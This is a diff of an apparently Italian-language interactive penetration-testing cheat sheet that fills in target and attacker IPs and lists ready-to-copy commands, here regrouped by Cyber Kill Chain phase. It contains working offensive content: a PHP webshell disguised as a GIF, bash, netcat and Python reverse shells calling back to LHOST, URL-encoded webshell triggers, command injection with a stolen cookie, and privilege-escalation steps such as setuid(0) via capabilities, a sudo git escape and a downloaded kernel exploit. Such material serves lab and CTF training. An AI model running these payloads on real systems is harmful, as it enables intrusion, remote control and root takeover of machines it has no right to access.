@@ -31,6 +31,8 @@
     --orange:#e8853a;
     --violet:#a98bdb;
     --red:#e06c6c;
+    --green:#5fcf8a;
+    --slate:#8a97b0;
     --mono:'JetBrains Mono',ui-monospace,SFMono-Regular,Menlo,monospace;
     --sans:'Inter',system-ui,-apple-system,sans-serif;
     box-sizing:border-box;
@@ -179,6 +181,10 @@
   }
   .chip b{color:var(--violet);font-weight:600}
   .chip .eg{color:var(--text-faint)}
+  /* ---------- Blocco nota/riferimento (non e' un comando) ---------- */
+  .ref{margin:2px 14px 12px;background:var(--surface-2);border:1px solid var(--line-soft);border-radius:8px;padding:9px 12px 10px}
+  .ref .ref-lbl{display:block;font-family:var(--mono);font-size:10px;letter-spacing:.07em;text-transform:uppercase;color:var(--text-dim);margin-bottom:6px}
+  .ref .ref-body{font-family:var(--mono);font-size:12.5px;line-height:1.6;color:var(--text-faint);white-space:pre-wrap;word-break:break-word;overflow-x:auto}
 
   .empty-note{display:none;color:var(--text-faint);font-family:var(--mono);font-size:13px;padding:30px 0;text-align:center}
   .empty-note.show{display:block}
@@ -261,7 +267,7 @@
   <nav class="phases" id="nav"></nav>
   <main>
     <p class="intro">
-      Compila i campi in alto (<code>&lt;TARGET&gt;</code>, <code>&lt;LHOST&gt;</code>, porta, <code>&lt;URL&gt;</code>, <code>&lt;COOKIE&gt;</code>):
+      I comandi sono ordinati secondo le <b>7 fasi della Cyber Kill Chain</b> (preceduti da un <span class="lg-violet">toolkit</span> di comandi trasversali). Compila i campi in alto (<code>&lt;TARGET&gt;</code>, <code>&lt;LHOST&gt;</code>, porta, <code>&lt;URL&gt;</code>, <code>&lt;COOKIE&gt;</code>):
       i comandi si aggiornano da soli e <b>copiano già il valore reale</b>. In <span class="lg-amber">ambra</span> le variabili live,
       in <span class="lg-violet">viola</span> i segnaposto <code>&lt;...&gt;</code> da adattare a mano — elencati nel riquadro
       <span class="lg-violet">da compilare</span> sotto ogni comando. Clicca un comando o il tasto copia per copiarlo.
@@ -294,97 +300,113 @@
 
 const DEFAULT_PHASES = [
   {
+    id:"setup", idx:"00", name:"Toolkit & Setup", color:"var(--slate)",
+    desc:"Comandi trasversali, non legati a una singola fase della Kill Chain: scoprire il TUO IP (LHOST), aprire una shell pulita, codificare/decodificare in base64. Da tenere a portata di mano: servono in qualsiasi momento.",
+    cmds:[
+      {c:"ip a", n:"Mostra i tuoi IP e le interfacce di rete. Da qui ricavi il tuo LHOST, cioè l'indirizzo da inserire nei payload di reverse shell.", d:["ip(8)","https://man7.org/linux/man-pages/man8/ip.8.html"]},
+      {c:"ifconfig", n:"Variante storica di 'ip a' per vedere IP e interfaccia. Usala se il comando 'ip' non e' disponibile.", d:["ifconfig","https://man7.org/linux/man-pages/man8/ifconfig.8.html"]},
+      {c:"/bin/bash", n:"Apre una shell bash completa. Utile quando ti ritrovi in una shell limitata (sh, dash) o appena preso un accesso grezzo: hai history, tab-completion e job control.", d:["bash","https://www.gnu.org/software/bash/manual/bash.html"]},
+      {c:"echo -n '<STRING>' | base64", n:"Codifica una stringa in base64. Comodo per impacchettare payload o aggirare filtri che bloccano certi caratteri. L'opzione -n evita l'a-capo finale.", f:[["<STRING>","id;whoami"]], d:["base64","https://man7.org/linux/man-pages/man1/base64.1.html"]},
+      {c:"echo '<STRING>' | base64 -d", n:"Decodifica un blob base64: chiavi, token o segreti trovati in pagine web, cookie o file di configurazione.", f:[["<STRING>","aGVsbG8="]], d:["base64","https://man7.org/linux/man-pages/man1/base64.1.html"]},
+    ]
+  },
+  {
     id:"recon", idx:"01", name:"Reconnaissance", color:"var(--cyan)",
-    desc:"Scoprire il proprio IP, gli host vivi sulla rete e le porte/servizi aperti sul bersaglio.",
+    desc:"Fase 1. Raccogliere informazioni sul bersaglio SENZA ancora attaccarlo: host vivi, porte e servizi aperti, mappa del web server, directory nascoste, utenti e versioni vulnerabili.",
     cmds:[
-      {c:"ip a", n:"Mostra i tuoi indirizzi IP e le interfacce di rete. Da qui ricavi il tuo LHOST.", d:["ip(8)","https://man7.org/linux/man-pages/man8/ip.8.html"]},
-      {c:"ifconfig", n:"Variante storica di ip a per vedere IP e interfaccia di rete.", d:["ifconfig","https://man7.org/linux/man-pages/man8/ifconfig.8.html"]},
-      {c:"sudo netdiscover -r {{LHOST}}/24", n:"Enumera gli host vivi sulla tua sottorete via ARP, poco rumoroso.", d:["netdiscover","https://github.com/netdiscover-scanner/netdiscover"]},
-      {c:"nmap -sn {{LHOST}}/24", n:"Ping/ARP sweep: elenca gli host attivi nella /24 senza scansionare le porte.", d:["nmap host discovery","https://nmap.org/book/host-discovery.html"]},
-      {c:"sudo nmap {{TARGET}} -p- -A -T4 -Pn -oN scan.txt", n:"Scansione completa delle 65535 porte con rilevamento servizi/OS, salvata su file. Scan di riferimento.", d:["nmap man","https://nmap.org/book/man.html"]},
-      {c:"nmap -sCV -p- {{TARGET}} -vvv", n:"Tutte le porte con script di default + versione dei servizi, output verboso.", d:["nmap -sC -sV","https://nmap.org/book/man-version-detection.html"]},
-      {c:"nmap {{TARGET}} -p <PORTS> -A", n:"Approfondisci solo le porte già trovate aperte con servizi e script.", f:[["<PORTS>","80,443,7744"]], d:["nmap -p","https://nmap.org/book/man-port-specification.html"]},
-      {c:"nmap --script=vuln {{TARGET}}", n:"Lancia tutti gli script NSE della categoria \"vuln\": scansione automatica di vulnerabilità note.", d:["nmap NSE vuln","https://nmap.org/nsedoc/categories/vuln.html"]},
-      {c:"nmap -p139 --script smb-enum-shares {{TARGET}}", n:"Enumera le condivisioni SMB e i relativi permessi sul bersaglio.", d:["smb-enum-shares","https://nmap.org/nsedoc/scripts/smb-enum-shares.html"]},
+      {c:"sudo netdiscover -r {{LHOST}}/24", n:"Enumera gli host vivi sulla tua sottorete via ARP. Poco rumoroso: utile quando non sai ancora qual e' il target.", d:["netdiscover","https://github.com/netdiscover-scanner/netdiscover"]},
+      {c:"nmap -sn {{LHOST}}/24", n:"Ping/ARP sweep: elenca gli host attivi nella /24 senza scansionare le porte. Serve a individuare il {{TARGET}}.", d:["nmap host discovery","https://nmap.org/book/host-discovery.html"]},
+      {c:"sudo nmap {{TARGET}} -p- -A -T4 -Pn -oN scan.txt", n:"Scansione di riferimento: tutte le 65535 porte (-p-), rilevamento servizi/versioni e OS (-A), output su file (-oN). -Pn salta il ping, utile se l'host blocca ICMP.", d:["nmap man","https://nmap.org/book/man.html"]},
+      {c:"nmap -sCV -p- {{TARGET}} -vvv", n:"Tutte le porte con script di default (-sC) e versione dei servizi (-sV), output molto verboso. Alternativa compatta alla scansione completa.", d:["nmap -sC -sV","https://nmap.org/book/man-version-detection.html"]},
+      {c:"nmap {{TARGET}} -p <PORTS> -A", n:"Approfondisci SOLO le porte gia' trovate aperte, con script e rilevamento versioni. Piu' rapido di riscansionare tutto.", f:[["<PORTS>","80,443,7744"]], d:["nmap -p","https://nmap.org/book/man-port-specification.html"]},
+      {c:"nmap --script=vuln {{TARGET}}", n:"Lancia tutti gli script NSE della categoria \"vuln\": scansione automatica di vulnerabilita' note sui servizi trovati.", d:["nmap NSE vuln","https://nmap.org/nsedoc/categories/vuln.html"]},
+      {c:"nmap -p139 --script smb-enum-shares {{TARGET}}", n:"Enumera le condivisioni SMB e i relativi permessi. SMB mal configurato e' spesso una via d'ingresso diretta.", d:["smb-enum-shares","https://nmap.org/nsedoc/scripts/smb-enum-shares.html"]},
+      {c:"whatweb {{URL}}/", n:"Identifica CMS, framework, linguaggi e versioni del sito con un solo comando. Primo sguardo al web server.", d:["whatweb","https://github.com/urbanadventurer/WhatWeb"]},
+      {c:"curl -i {{URL}}/robots.txt", n:"robots.txt elenca spesso percorsi che il sito vuole nascondere ai motori di ricerca (Disallow): ottimi candidati da esplorare.", d:["curl","https://curl.se/docs/manpage.html"]},
+      {c:"curl -i -X OPTIONS {{URL}}/", n:"Chiede al server quali metodi HTTP accetta (header Allow nella risposta). Se compaiono PUT o DELETE puoi spesso caricare o cancellare file direttamente, senza bisogno di un form di upload.", d:["HTTP OPTIONS","https://developer.mozilla.org/docs/Web/HTTP/Methods/OPTIONS"]},
+      {c:"nikto -h {{URL}}/", n:"Scansione del web server: header di sicurezza mancanti, file sensibili esposti, problemi SSL/TLS e vulnerabilita' note.", d:["nikto","https://github.com/sullo/nikto"]},
+      {c:"gobuster dir -u {{URL}}/ -w /usr/share/dirb/wordlists/common.txt", n:"Brute force di directory e file: scopre percorsi non linkati da nessuna pagina (pannelli admin, cartelle di upload, backup).", d:["gobuster","https://github.com/OJ/gobuster"]},
+      {c:"gobuster dir -u {{URL}}/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,html", n:"Enumerazione piu' profonda con una wordlist grande, provando anche le estensioni indicate (-x). Lento ma esaustivo.", f:[["-x","php,txt,html,bak"]], d:["gobuster","https://github.com/OJ/gobuster"]},
+      {c:"dirsearch -u {{URL}}/ --exclude-status=300-399,400-499,500-599", n:"Enumera directory e file nascosti scartando subito i codici di redirect/errore, cosi' resti solo con i 200 interessanti.", d:["dirsearch","https://github.com/maurosoria/dirsearch"]},
+      {c:"ffuf -w /usr/share/dirb/wordlists/common.txt -u {{URL}}/FUZZ -fc 403,404", n:"Fuzzing veloce dei percorsi: sostituisce FUZZ con ogni parola della wordlist e filtra via (-fc) i 403/404.", d:["ffuf","https://github.com/ffuf/ffuf"]},
+      {c:"smbclient -L //{{TARGET}}/ -N", n:"Elenca le condivisioni SMB tentando l'accesso anonimo (-N = senza password). A volte sono leggibili e contengono file utili.", d:["smbclient","https://www.samba.org/samba/docs/current/man-html/smbclient.1.html"]},
+      {c:"wpscan --url {{URL}}/ -e u", n:"Su un sito WordPress, enumera gli username registrati (-e u): sono meta' credenziale, utili per il brute force successivo.", d:["wpscan","https://github.com/wpscanteam/wpscan"]},
+      {c:"searchsploit <SERVICE> <VERSION>", n:"Cerca su Exploit-DB exploit pubblici per il servizio+versione trovati da nmap. E' il ponte tra 'ho visto cosa c'e'' e 'so come colpirlo'.", f:[["<SERVICE>","proftpd"],["<VERSION>","1.3.3c"]], d:["searchsploit","https://www.exploit-db.com/searchsploit"]},
     ]
   },
   {
-    id:"enum", idx:"02", name:"Enumeration", color:"var(--blue)",
-    desc:"Mappare il web server, le directory nascoste, gli utenti e cercare exploit per le versioni trovate.",
+    id:"weaponize", idx:"02", name:"Weaponization", color:"var(--blue)",
+    desc:"Fase 2. Preparare le \"armi\" PRIMA di lanciarle: scegliere il payload giusto per cio' che il target ha installato, costruire la webshell, scrivere il comando di reverse shell, generare wordlist su misura e scaricare l'exploit scelto.",
     cmds:[
-      {c:"whatweb {{URL}}/", n:"Identifica CMS, framework, linguaggi e versioni del sito.", d:["whatweb","https://github.com/urbanadventurer/WhatWeb"]},
-      {c:"curl -i {{URL}}/robots.txt", n:"Spesso rivela percorsi che il sito vuole tenere nascosti (Disallow).", d:["curl","https://curl.se/docs/manpage.html"]},
-      {c:"nikto -h {{URL}}/", n:"Scansione del web server: header, file sensibili, SSL/TLS e vulnerabilità note.", d:["nikto","https://github.com/sullo/nikto"]},
-      {c:"gobuster dir -u {{URL}}/ -w /usr/share/dirb/wordlists/common.txt", n:"Brute force di directory e file su un web server, anche senza link visibili.", d:["gobuster","https://github.com/OJ/gobuster"]},
-      {c:"gobuster dir -u {{URL}}/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,html", n:"Enumerazione più profonda provando anche le estensioni indicate.", f:[["-x","php,txt,html,bak"]], d:["gobuster","https://github.com/OJ/gobuster"]},
-      {c:"dirsearch -u {{URL}}/ --exclude-status=300-399,400-499,500-599", n:"Enumera directory e file nascosti scartando i codici di errore/redirect.", d:["dirsearch","https://github.com/maurosoria/dirsearch"]},
-      {c:"ffuf -w /usr/share/dirb/wordlists/common.txt -u {{URL}}/FUZZ -fc 403,404", n:"Fuzzing dei percorsi: sostituisce FUZZ con ogni parola, filtra 403/404.", d:["ffuf","https://github.com/ffuf/ffuf"]},
-      {c:"smbclient -L //{{TARGET}}/ -N", n:"Elenca le condivisioni SMB in accesso anonimo (-N = senza password).", d:["smbclient","https://www.samba.org/samba/docs/current/man-html/smbclient.1.html"]},
-      {c:"wpscan --url {{URL}}/ -e u", n:"Enumera gli utenti registrati di un sito WordPress.", d:["wpscan","https://github.com/wpscanteam/wpscan"]},
-      {c:"wpscan --url {{URL}}/ -U <USER> -P /usr/share/wordlists/rockyou.txt", n:"Attacco a dizionario sulla password di un utente WordPress.", f:[["<USER>","admin"]], d:["wpscan","https://github.com/wpscanteam/wpscan"]},
-      {c:"cewl -w password.txt {{URL}}/", n:"Costruisce una wordlist dalle parole del sito, utile per attacchi mirati.", d:["cewl","https://github.com/digininja/CeWL"]},
-      {c:"searchsploit <SERVICE> <VERSION>", n:"Cerca su Exploit-DB exploit noti per un servizio e versione.", f:[["<SERVICE>","proftpd"],["<VERSION>","1.3.3c"]], d:["searchsploit","https://www.exploit-db.com/searchsploit"]},
+      {c:"which nc bash python python3 perl", n:"Da eseguire SUL target (anche via webshell): dice quali interpreti/strumenti ci sono, cosi' scegli un payload che funzionera' davvero invece di tentare a caso.", d:["which","https://man7.org/linux/man-pages/man1/which.1.html"]},
+      {c:"echo \"GIF89a; <?php system($_GET['cmd']); ?>\" > shell.php.gif", n:"Costruisce una webshell PHP camuffata da GIF: i byte iniziali 'GIF89a' superano i filtri che accettano solo immagini, mentre il PHP viene eseguito dal server. Il parametro ?cmd= diventa il tuo punto di esecuzione comandi (lo userai nella fase Exploitation).", d:["webshell","https://book.hacktricks.xyz/pentesting-web/file-upload"]},
+      {c:"bash -i >& /dev/tcp/{{LHOST}}/{{LPORT}} 0>&1", n:"Payload reverse shell in bash puro: il target si riconnette a TE. Funziona solo in bash (usa /dev/tcp). L'IP e' il TUO (LHOST), senza http://. Lo consegnerai via webshell o injection.", d:["revshell generator","https://www.revshells.com/"]},
+      {c:"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|/bin/nc {{LHOST}} {{LPORT}} >/tmp/f", n:"Payload reverse shell con netcat SENZA opzione -e (tipico su sistemi vecchi dove nc non la supporta). Molto affidabile: usa una fifo per collegare shell e connessione.", d:["revshell fifo","https://www.revshells.com/"]},
+      {c:"nc -e /bin/bash {{LHOST}} {{LPORT}}", n:"Payload reverse shell piu' corto, valido solo se il netcat del target supporta -e (molte versioni no: in quel caso usa la variante fifo qui sopra).", d:["netcat","https://linux.die.net/man/1/nc"]},
+      {c:"python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{{LHOST}}\",{{LPORT}}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/bash\",\"-i\"])'", n:"Payload reverse shell in Python: utile quando bash/nc non vanno ma python e' presente. Collega stdin/stdout/stderr al socket e avvia una bash interattiva.", d:["revshell python","https://www.revshells.com/"]},
+      {c:"cewl -w password.txt {{URL}}/", n:"Costruisce una wordlist partendo dalle parole presenti sul sito: spesso le password deboli derivano da dominio/azienda. Pronta per alimentare un brute force.", d:["cewl","https://github.com/digininja/CeWL"]},
+      {c:"searchsploit -m <EDB_ID>", n:"Scarica (mirror) nella cartella corrente il codice dell'exploit scelto su Exploit-DB. Esempio: OverlayFS per kernel 3.13 e' l'EDB-ID 37292.", f:[["<EDB_ID>","37292"]], d:["searchsploit","https://www.exploit-db.com/searchsploit"]},
     ]
   },
   {
-    id:"web", idx:"03", name:"Web Exploitation", color:"var(--orange)",
-    desc:"SQL injection per il bypass del login, lettura/inclusione di file (LFI) e upload di una webshell per arrivare all'esecuzione di codice (RCE).",
+    id:"delivery", idx:"03", name:"Delivery", color:"var(--orange)",
+    desc:"Fase 3. Far arrivare l'arma fino al bersaglio: avviare un server per far scaricare i file al target, caricare la webshell tramite un form di upload, o trasferire l'exploit sulla macchina.",
     cmds:[
-      {c:"curl -s {{URL}}/<ENDPOINT> --data \"file=<FILE>\"", n:"Endpoint che riceve un nome di file: primo test per capire se legge o include file lato server.", f:[["<ENDPOINT>","test"],["<FILE>","index.php"]], d:["LFI","https://owasp.org/www-community/attacks/Path_Traversal"]},
+      {c:"python3 -m http.server 80", n:"Sulla TUA Kali: trasforma la cartella corrente in un server HTTP. Da qui il target potra' scaricare webshell, exploit o strumenti. Porta 80 perche' quasi sempre e' consentita in uscita.", d:["http.server","https://docs.python.org/3/library/http.server.html"]},
+      {c:"curl -s -F \"<FIELD>=@shell.php.gif\" {{URL}}/<UPLOAD_ENDPOINT>", n:"Carica la webshell tramite un form di upload (multipart). <FIELD> e' il nome del campo file del form (lo vedi nell'HTML della pagina) e <UPLOAD_ENDPOINT> la pagina che riceve l'upload. Annota poi dove finisce il file (es. /uploads/).", f:[["<FIELD>","file"],["<UPLOAD_ENDPOINT>","upload.php"]], d:["file upload","https://book.hacktricks.xyz/pentesting-web/file-upload"]},
+      {c:"wget {{LHOST}}/<FILE> -O <FILE>", n:"SUL target: scarica un file dal tuo http.server (exploit, script di enumerazione come linpeas, binari statici). Da abbinare al 'python3 -m http.server' qui sopra.", f:[["<FILE>","linpeas.sh"]], d:["wget","https://www.gnu.org/software/wget/manual/wget.html"]},
     ]
   },
   {
-    id:"revshell", idx:"04", name:"Reverse Shell", color:"var(--violet)",
-    desc:"Aprire un listener sulla tua macchina e far connettere il target verso di te. REGOLA: prima accendi il listener, POI lanci il payload; non premere Ctrl+C sul listener.",
+    id:"exploit", idx:"04", name:"Exploitation", color:"var(--red)",
+    desc:"Fase 4. Scatenare l'esecuzione di codice: innescare la webshell caricata, sfruttare LFI/inclusione di file, o iniettare comandi in un parametro vulnerabile per ottenere la reverse shell. Prima di lanciare, accendi il listener (fase Installation).",
     cmds:[
-      {c:"sudo nc -nvlp {{LPORT}}", n:"PASSO 1 — Listener in ascolto in un terminale SEPARATO. Lascialo fermo: non scrivere niente e non premere Ctrl+C finché non arriva la shell.", d:["netcat","https://linux.die.net/man/1/nc"]},
-      {c:"which nc bash python python3 perl", n:"Da eseguire sul target (anche via webshell) per sapere QUALE payload puoi usare prima di tentare a caso.", d:["which","https://man7.org/linux/man-pages/man1/which.1.html"]},
-      {c:"bash -i >& /dev/tcp/{{LHOST}}/{{LPORT}} 0>&1", n:"PASSO 2 — Reverse shell bash. Da eseguire sul target (anche via webshell). /dev/tcp funziona solo in bash: l'IP è il TUO, senza http://.", d:["revshell generator","https://www.revshells.com/"]},
-      {c:"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|/bin/nc {{LHOST}} {{LPORT}} >/tmp/f", n:"Alternativa con netcat priva di -e (tipica su sistemi vecchi, es. Ubuntu datati). Molto affidabile.", d:["revshell fifo","https://www.revshells.com/"]},
-      {c:"nc -e /bin/bash {{LHOST}} {{LPORT}}", n:"Reverse shell con netcat se la versione sul target supporta -e (molte non lo hanno: in quel caso usa la variante fifo).", d:["netcat","https://linux.die.net/man/1/nc"]},
+      {c:"curl -s {{URL}}/<ENDPOINT> --data \"file=<FILE>\"", n:"Testa un endpoint che riceve un nome di file: primo controllo per capire se legge o include file lato server (LFI/RFI). Prova anche ../../../etc/passwd per confermare il path traversal.", f:[["<ENDPOINT>","test"],["<FILE>","index.php"]], d:["LFI","https://owasp.org/www-community/attacks/Path_Traversal"]},
+      {c:"curl -s \"{{URL}}/<WEBSHELL>?cmd=<RCE>\"", n:"Innesca la webshell caricata eseguendo un comando arbitrario sul server (RCE). Primo test: usa 'id' o 'whoami' per confermare l'esecuzione e capire con quale utente giri.", f:[["<WEBSHELL>","uploads/shell.php.gif"],["<RCE>","id"]], d:["webshell RCE","https://book.hacktricks.xyz/pentesting-web/file-upload"]},
+      {c:"curl -s \"{{URL}}/<WEBSHELL>?cmd=bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F{{LHOST}}%2F{{LPORT}}%200%3E%261%22\"", n:"Innesca la webshell con una reverse shell bash gia' URL-encoded: il target si connette al tuo listener. Avere 'nc -nvlp {{LPORT}}' in ascolto PRIMA di lanciare (fase Installation).", f:[["<WEBSHELL>","uploads/shell.php.gif"]], d:["revshell generator","https://www.revshells.com/"]},
+      {c:"curl -s \"{{URL}}/<WEBSHELL>?cmd=python%20-c%20%27import%20socket%2Csubprocess%2Cos%3Bs%3Dsocket.socket%28socket.AF_INET%2Csocket.SOCK_STREAM%29%3Bs.connect%28%28%22{{LHOST}}%22%2C{{LPORT}}%29%29%3Bos.dup2%28s.fileno%28%29%2C0%29%3Bos.dup2%28s.fileno%28%29%2C1%29%3Bos.dup2%28s.fileno%28%29%2C2%29%3Bsubprocess.call%28%5B%22%2Fbin%2Fbash%22%2C%22-i%22%5D%29%27\"", n:"Come sopra ma con reverse shell Python (URL-encoded): usala quando sul target non c'e' bash utilizzabile via /dev/tcp ma c'e' python.", f:[["<WEBSHELL>","uploads/shell.php.gif"]], d:["revshell python","https://www.revshells.com/"]},
+      {c:"curl -s \"{{URL}}/<ENDPOINT>?cmd=rm%20/tmp/f;mkfifo%20/tmp/f;cat%20/tmp/f|/bin/bash%20-i%202%3E%261|/bin/nc%20{{LHOST}}%20{{LPORT}}%20%3E/tmp/f\" -b \"{{COOKIE}}\"", n:"Command injection su un parametro che richiede una sessione autenticata: il cookie viene passato con -b. Il payload e' la reverse shell fifo (nc senza -e), gia' URL-encoded.", f:[["<ENDPOINT>","panel.php"]], d:["command injection","https://owasp.org/www-community/attacks/Command_Injection"]},
     ]
   },
   {
-    id:"shell", idx:"05", name:"Shell Upgrade & Escape", color:"var(--green)",
-    desc:"Trasformare una shell grezza in una interattiva (TTY) ed evadere da una restricted shell (rbash).",
+    id:"install", idx:"05", name:"Installation", color:"var(--violet)",
+    desc:"Fase 5. Ricevere e consolidare l'accesso: mettere in ascolto il listener che cattura la reverse shell e stabilire un punto d'appoggio piu' stabile (accesso SSH con chiavi o credenziali trovate).",
     cmds:[
-      {c:"python3 -c 'import pty; pty.spawn(\"/bin/bash\")'", n:"Promuove una shell \"muta\" a pty interattiva. Usa python se python3 non c'è.", d:["TTY upgrade","https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Full%20TTYs.md"]},
-      {c:"echo $PATH", n:"In una restricted shell, mostra dove il sistema cerca i binari: capisci cosa puoi eseguire.", d:["rbash","https://gtfobins.github.io/"]},
-      {c:":set shell=/bin/bash\n:shell", n:"Dentro vi/vim: imposta bash come shell ed evadi la restricted shell lanciandola.", d:["GTFOBins vi","https://gtfobins.github.io/gtfobins/vi/"]},
-      {c:"export PATH=/bin:/usr/bin:$PATH", n:"Dopo l'escape, ripristina un PATH usabile per riavere tutti i comandi.", d:["rbash escape","https://gtfobins.github.io/"]},
+      {c:"sudo nc -nvlp {{LPORT}}", n:"PASSO 1 — Listener in ascolto, in un terminale SEPARATO. Avvialo PRIMA di lanciare il payload di Exploitation, poi lascialo fermo: non scrivere nulla e non premere Ctrl+C finche' non arriva la shell.", d:["netcat","https://linux.die.net/man/1/nc"]},
+      {c:"ssh -i ssh_key.txt <USER>@{{TARGET}}", n:"Accesso stabile tramite chiave privata SSH trovata sul target (home, backup, file di config). Se la chiave ha una passphrase, inseriscila quando richiesto.", f:[["<USER>","root"]], d:["ssh -i","https://man.openbsd.org/ssh"]},
+      {c:"ssh <USER>@{{TARGET}} -p <PORT>", n:"Accesso SSH riutilizzando credenziali trovate altrove: il riuso delle password tra servizi e' comunissimo e da' un canale piu' comodo della reverse shell.", f:[["<USER>","root"],["<PORT>","22"]], d:["ssh","https://man.openbsd.org/ssh"]},
     ]
   },
   {
-    id:"privesc", idx:"06", name:"Privilege Escalation", color:"var(--red)",
-    desc:"Da utente non privilegiato a root: enumerazione, sudo misconfigurati, SUID/GTFOBins, exploit del kernel e chiavi SSH.",
+    id:"c2", idx:"06", name:"Command & Control", color:"var(--green)",
+    desc:"Fase 6. Prendere il controllo operativo dell'host: trasformare una shell grezza in un terminale interattivo completo (TTY) ed evadere da eventuali restricted shell, cosi' da lavorare davvero sulla macchina.",
     cmds:[
-      {c:"whoami; id", n:"Chi sei e a quali gruppi appartieni: il punto di partenza di ogni escalation.", d:["id","https://man7.org/linux/man-pages/man1/id.1.html"]},
-      {c:"uname -a", n:"Versione del kernel: serve a cercare kernel exploit applicabili (es. OverlayFS su kernel 3.13).", d:["uname","https://man7.org/linux/man-pages/man1/uname.1.html"]},
-      {c:"sudo -l", n:"Elenca cosa puoi eseguire via sudo (magari senza password): spesso è la via diretta a root.", d:["sudo","https://www.sudo.ws/docs/man/sudo.man/"]},
-      {c:"find / -perm -u=s -type f 2>/dev/null", n:"Trova i binari con bit SUID: eseguono con i permessi del proprietario, spesso root. Confrontali su GTFOBins.", d:["SUID","https://gtfobins.github.io/#+suid"]},
-      {c:"find . -exec /bin/sh \\; -quit", n:"Se find è SUID, apre una shell con i privilegi del proprietario (GTFOBins).", d:["GTFOBins find","https://gtfobins.github.io/gtfobins/find/"]},
-      {c:"find / -writable -type f 2>/dev/null | grep -vE '^/(proc|sys|dev)'", n:"Elenca i file scrivibili dal tuo utente (escludendo /proc, /sys, /dev). Cerca script/config eseguiti da root: cron, servizi systemd, /etc/passwd, sudoers. Scrivibile NON basta: deve anche essere eseguito da root.", d:["writable files","https://book.hacktricks.xyz/linux-hardening/privilege-escalation#writable-files"]},
-      {c:"getcap -r / 2>/dev/null", n:"Elenca i binari con Linux capabilities: poteri root parziali assegnati a singoli file. Alcune combinazioni valgono una shell root diretta. Incrocia il binario trovato con GTFOBins (sezione Capabilities).", d:["GTFOBins caps","https://gtfobins.github.io/#+capabilities"]},
-      {c:"// capabilities che portano a root se le trovi su un binario:\n// cap_setuid       -> root DIRETTO su interpreti (python/perl/ruby/node/php)\n// cap_setgid       -> cambio gruppo, utile combinato con setuid\n// cap_dac_override -> scrivi file protetti (/etc/passwd, /etc/sudoers) -> root\n// cap_dac_read_search -> leggi file protetti (/etc/shadow, chiavi SSH)\n// cap_setfcap      -> assegni capability ad altri binari -> ti crei il caso sopra\n// cap_sys_admin / cap_sys_ptrace -> potenti ma richiedono piu' lavoro\n// (cap_net_raw / cap_net_bind_service di norma NON danno root)", n:"Promemoria: non tutte le capability portano a root. Quelle qui sopra sì (direttamente o in due passaggi); le altre di solito no. Verifica sempre su GTFOBins.", d:["Linux caps","https://man7.org/linux/man-pages/man7/capabilities.7.html"]},
-      {c:"<BINARIO> -c 'import os; os.setuid(0); os.system(\"/bin/bash\")'", n:"Se un INTERPRETE ha cap_setuid (es. da getcap: /usr/bin/python3.x cap_setuid=ep), setuid(0) ti fa root. Sostituisci <BINARIO> col percorso esatto trovato da getcap. La sintassi -c 'import os...' vale per python; per perl/ruby/node vedi GTFOBins.", f:[["<BINARIO>","/usr/bin/python3.13"]], d:["GTFOBins python caps","https://gtfobins.github.io/gtfobins/python/#capabilities"]},
-      {c:"sudo git -p help config\n!/bin/bash", n:"Se puoi usare git via sudo: apri l'help e, dentro il pager, digita !/bin/bash per una shell root.", d:["GTFOBins git","https://gtfobins.github.io/gtfobins/git/"]},
-      {c:"searchsploit -m <EDB_ID>", n:"Copia l'exploit scelto nella cartella corrente. Per OverlayFS (kernel 3.13): EDB-ID 37292.", f:[["<EDB_ID>","37292"]], d:["searchsploit","https://www.exploit-db.com/searchsploit"]},
-      {c:"python -m http.server 80", n:"Sulla TUA Kali: servi l'exploit via HTTP per scaricarlo dal target. Usa python3 se serve.", d:["http.server","https://docs.python.org/3/library/http.server.html"]},
-      {c:"wget {{LHOST}}/<EXPLOIT>.c -O exploit.c\ngcc exploit.c -o exploit\n./exploit", n:"Sul TARGET: scarica, compila (serve gcc) ed esegui l'exploit del kernel. La compilazione va fatta sul target per linkarlo al suo kernel.", f:[["<EXPLOIT>","37292"]], d:["OverlayFS CVE-2015-1328","https://www.exploit-db.com/exploits/37292"]},
-      {c:"ssh -i ssh_key.txt <USER>@{{TARGET}}", n:"Accedi con la chiave privata una volta nota la passphrase.", f:[["<USER>","root"]], d:["ssh -i","https://man.openbsd.org/ssh"]},
-      {c:"ssh <USER>@{{TARGET}} -p <PORT>", n:"Accesso SSH riutilizzando credenziali trovate (il riuso password è comunissimo).", f:[["<USER>","root"],["<PORT>","22"]], d:["ssh","https://man.openbsd.org/ssh"]},
+      {c:"python3 -c 'import pty; pty.spawn(\"/bin/bash\")'", n:"Promuove una shell \"muta\" a pty interattiva (primo passo dell'upgrade). Usa 'python' al posto di 'python3' se solo quello e' presente.", d:["TTY upgrade","https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Full%20TTYs.md"]},
+      {c:"python3 -c 'import pty; pty.spawn(\"/bin/bash\")'\n# poi premi Ctrl+Z (sospende e ti riporta su Kali), e da Kali:\nstty raw -echo; fg\n# premi Invio due volte: ricompare la shell del target, poi:\nexport TERM=xterm; export SHELL=/bin/bash", n:"TTY completa, passo per passo: ottieni una shell con frecce su/giu', tab, Ctrl+C ed editor a schermo intero (vi/nano) funzionanti. NON e' un copia-incolla unico: Ctrl+Z e Invio sono azioni da tastiera. Da fare subito dopo aver preso la shell.", d:["Full TTY","https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Full%20TTYs.md"]},
+      {c:"echo $PATH", n:"Dentro una restricted shell (rbash), mostra dove il sistema cerca i binari: capisci quali comandi riesci effettivamente a lanciare.", d:["rbash","https://gtfobins.github.io/"]},
+      {c:":set shell=/bin/bash\n:shell", n:"Dentro vi/vim: imposta bash come shell ed esci dalla restricted shell lanciandola. Uno dei tanti \"escape\" catalogati su GTFOBins.", d:["GTFOBins vi","https://gtfobins.github.io/gtfobins/vi/"]},
